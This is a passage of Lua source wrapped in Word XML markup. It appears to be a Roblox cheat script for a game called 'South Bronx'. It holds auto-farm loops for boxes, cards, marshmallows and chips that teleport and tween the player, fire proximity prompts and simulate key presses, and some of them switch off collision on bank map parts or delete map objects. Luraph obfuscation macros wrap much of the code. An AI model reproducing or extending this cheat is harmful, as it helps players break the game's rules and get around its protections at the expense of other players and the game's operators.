      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        until LocalPlayer.Character.Humanoid.Health &lt;= 15</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local number = 1</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        repeat task.wait()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame + Vector3.new(0, 1, 0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        number+=1</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if number &gt; 50 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            LocalPlayer.Character.HumanoidRootPart.Anchored = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        until LocalPlayer.Character.Humanoid:GetState() ~= Enum.HumanoidStateType.Physics</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.delay(4, function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            E1:Disconnect()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            E3:Disconnect()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            E5:Disconnect()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        LocalPlayer.Character.HumanoidRootPart.Anchored = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    DeleteSecretUI()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    tp_debounce = false</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    return (LocalPlayer.Character.HumanoidRootPart.Position - CFrame.Position).Magnitude &lt; 20 and "Success" or "Failed"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 ATMPositions = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ATM1 = CFrame.new(-30, 4, -300);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ATM2 = CFrame.new(539, 4, -353);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ATM3 = CFrame.new(497, 4, 403);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ATM4 = CFrame.new(236, 4, -158);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ATM5 = CFrame.new(525, -8, -92);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ATM6 = CFrame.new(-450, 4, 370);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ATM7 = CFrame.new(-266, 4, -209);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ATM8 = CFrame.new(-11, 4, 231);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ATM9 = CFrame.new(717, 4, 410);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ATM10 = CFrame.new(-532, 3, -21);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ATM11 = CFrame.new(-646, 4, 155);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ATM12 = CFrame.new(698, 3, -241);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ATM13 = CFrame.new(-315, 4, 142);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ATM14 = CFrame.new(-378, 4, -365);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ATM15 = CFrame.new(360, 4, -364);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ATM16 = CFrame.new(870, 3, -346);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ATM17 = CFrame.new(904, 3, -99);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ATM18 = CFrame.new(1095, 3, 178);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ATM19 = CFrame.new(1054, 4, 585);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ATM20 = CFrame.new(895, 4, 142);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ATM21 = CFrame.new(1021, 3, -229);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            };</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local PressKeyTween = LPH_NO_VIRTUALIZE(function(KeyCode, Tween)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    VirtualInputManager:SendKeyEvent(false, KeyCode, false, game)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    VirtualInputManager:SendKeyEvent(true, KeyCode, false, game)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Tween.Completed:Wait()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    VirtualInputManager:SendKeyEvent(false, KeyCode, false, game)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local PressKey = function(KeyCode, Duration)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.spawn(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Services.VirtualInputManager:SendKeyEvent(false, KeyCode, false, game)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Services.VirtualInputManager:SendKeyEvent(true, KeyCode, false, game)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.wait(Duration)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Services.VirtualInputManager:SendKeyEvent(false, KeyCode, false, game)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local boxfarm_thread</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Start_BoxFarm = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                boxfarm_thread = task.spawn(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    while task.wait() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not LocalPlayer.Character then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not Config.South_Bronx.FarmingUtilities.BoxFarm then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not LocalPlayer.Backpack:FindFirstChild("Crate") and not LocalPlayer.Character:FindFirstChild("Crate") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local DistanceFromBox = GetDistance(LocalPlayer.Character.HumanoidRootPart.Position, Vector3.new(-549, 3, -82))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local Tween = Services.TweenService:Create(LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(GetTweenSpeed(DistanceFromBox), Enum.EasingStyle.Linear), {CFrame = CFrame.new(-549.1292724609375, 3.5371456146240234, -82.9239501953125)})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            PressKeyTween(Enum.KeyCode.W, Tween) ; PressKeyTween(Enum.KeyCode.LeftShift, Tween)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Tween:Play() ; Tween.Completed:Wait() ; Tween = nil</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            fireproximityprompt(Workspace.PlaceHere.Attachment.ProximityPrompt)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            repeat task.wait() until LocalPlayer.Backpack:FindFirstChild("Crate")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            LocalPlayer.Character.Humanoid:EquipTool(LocalPlayer.Backpack.Crate)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not LocalPlayer.Character:FindFirstChild("Crate") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            LocalPlayer.Character.Humanoid:EquipTool(LocalPlayer.Backpack:FindFirstChild("Crate"))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not LocalPlayer.Backpack:FindFirstChild("Crate") and not LocalPlayer.Character:FindFirstChild("Crate") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            continue</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local DistanceFromTruck = GetDistance(LocalPlayer.Character.HumanoidRootPart.Position, Vector3.new(-401.04364013671875, 3.3621325492858887, -72.07713317871094))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Tween = Services.TweenService:Create(LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(GetTweenSpeed(DistanceFromTruck), Enum.EasingStyle.Linear), {CFrame = CFrame.new(-401.04364013671875, 3.3621325492858887, -72.07713317871094)})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        PressKeyTween(Enum.KeyCode.W, Tween) ; PressKeyTween(Enum.KeyCode.LeftShift, Tween)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Tween:Play() ; Tween.Completed:Wait() ; Tween = nil</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        fireproximityprompt(Workspace.cratetruck2.Model.ClickBox.Attachment.ProximityPrompt)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(0.9)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Stop_BoxFarm = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not boxfarm_thread then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if coroutine.status(boxfarm_thread) == "suspended" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.cancel(boxfarm_thread)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task.spawn(LPH_JIT_MAX(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                while task.wait(.1) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Config.South_Bronx.FarmingUtilities.CardFarm then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not LocalPlayer.Character and not LocalPlayer.Character:FindFirstChild("Humanoid") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    LocalPlayer.Character:FindFirstChild("Humanoid").Sit = false ; LocalPlayer.Character:FindFirstChild("Humanoid").Jump = true</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    for Index, Value in Workspace.Map.Locations["Community Bank"]:GetDescendants() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Value.CanCollide = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end)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task.spawn(LPH_JIT_MAX(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                while task.wait(.1) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Config.South_Bronx.FarmingUtilities.MarshmallowFarm then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not LocalPlayer.Character and not LocalPlayer.Character:FindFirstChild("Humanoid") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    LocalPlayer.Character:FindFirstChild("Humanoid").Sit = false ; LocalPlayer.Character:FindFirstChild("Humanoid").Jump = true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</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            playerHasCard = false</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.spawn(LPH_JIT_MAX(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                while task.wait(.1) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Config.South_Bronx.FarmingUtilities.CardFarm then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Workspace.Map.Decor:FindFirstChild("rail thing"):Destroy()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Workspace.Map.Decor:FindFirstChild("rail thing") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        break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MarshmallowFarm_Thread</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Start_MarshmallowFarm = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                MarshmallowFarm_Thread = task.spawn(LPH_JIT_MAX(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    while wait() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not Config.South_Bronx.FarmingUtilities.MarshmallowFarm then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Owns_Bike = Config.South_Bronx.OwnedBike == "No"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Marshmellow_Increment = Config.South_Bronx.FarmingUtilities.MarshmallowIncrement</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Items = {"Gelatin", "Sugar Block Bag", "Water"}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Teleport(CFrame.new(510, 4, 602), Owns_Bike)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        for _ = 1, Marshmellow_Increment do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            for Index, Value in Items do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                ReplicatedStorage:WaitForChild("RemoteEvents"):WaitForChild("StorePurchase"):FireServer(Value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                task.wait()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task.wait(3)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local House = GetHouse();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not House then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            repeat task.wait() House = GetHouse() until House ~= nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Pot = House.Interior["Cooking Pot"]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Teleport(Pot.CFrame, Owns_Bike)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        LocalPlayer.Character.Humanoid:MoveTo(Pot.Position)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        LocalPlayer.Character.Humanoid.MoveToFinished:Wait()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        for _ = 1, Marshmellow_Increment do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if not LocalPlayer.Character:FindFirstChild("Water") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                LocalPlayer.Character.Humanoid:EquipTool(LocalPlayer.Backpack:FindFirstChild("Water"))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            fireproximityprompt(Pot.Attachment.ProximityPrompt)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait(2.5)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            repeat task.wait() until Pot.Timer.TextLabel.Text == "0"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if not LocalPlayer.Character:FindFirstChild("Sugar Block Bag") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                LocalPlayer.Character.Humanoid:EquipTool(LocalPlayer.Backpack:FindFirstChild("Sugar Block Bag"))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            fireproximityprompt(Pot.Attachment.ProximityPrompt)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait(2.5)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            LocalPlayer.Character.Humanoid:UnequipTools()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if not LocalPlayer.Character:FindFirstChild("Gelatin") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                LocalPlayer.Character.Humanoid:EquipTool(LocalPlayer.Backpack:FindFirstChild("Gelatin"))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            fireproximityprompt(Pot.Attachment.ProximityPrompt)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait(3)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            repeat task.wait() until Pot.Timer.TextLabel.Text == "0"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if not LocalPlayer.Character:FindFirstChild("Empty Bag") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                LocalPlayer.Character.Humanoid:EquipTool(LocalPlayer.Backpack:FindFirstChild("Empty Bag"))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            fireproximityprompt(Pot.Attachment.ProximityPrompt)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            LocalPlayer.Character.Humanoid:UnequipTools()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Teleport(CFrame.new(510, 4, 602), Owns_Bike)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        repeat task.wait() until Workspace.NPCs:FindFirstChild('Lamont Bell')</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        LocalPlayer.Character.Humanoid:MoveTo(Vector3.new(511, 4, 598))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        LocalPlayer.Character.Humanoid.MoveToFinished:Wait()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        for Index, Value in LocalPlayer.Backpack:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if Value:IsA("Tool") and Value.Name:find("Marshmallow") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                LocalPlayer.Character.Humanoid:EquipTool(Value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                fireproximityprompt(Workspace.NPCs["Lamont Bell"].UpperTorso.ProximityPrompt)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                task.wait(0.25)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task.wait(3)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Stop_MarshmallowFarm = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not MarshmallowFarm_Thread then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if coroutine.status(MarshmallowFarm_Thread) == "suspended" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.cancel(MarshmallowFarm_Thread)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 ChipFarm_Thread</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Start_ChipFarm = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ChipFarm_Thread = task.spawn(LPH_JIT_MAX(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    while task.wait(1) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not Config.South_Bronx.FarmingUtilities.ChipFarm then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Owns_Bike = Config.South_Bronx.OwnedBike == "No"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not LocalPlayer.Backpack:FindFirstChild("Flour") or not LocalPlayer.Backpack:FindFirstChild("Potato") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Teleport_Status = Teleport(CFrame.new(-773, 4, -157), Owns_Bike)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if not LocalPlayer.Backpack:FindFirstChild("Flour") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                repeat task.wait(2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                ReplicatedStorage:WaitForChild("RemoteEvents"):WaitForChild("StorePurchase"):FireServer("Flour")</w:t>
      </w:r>
    </w:p>
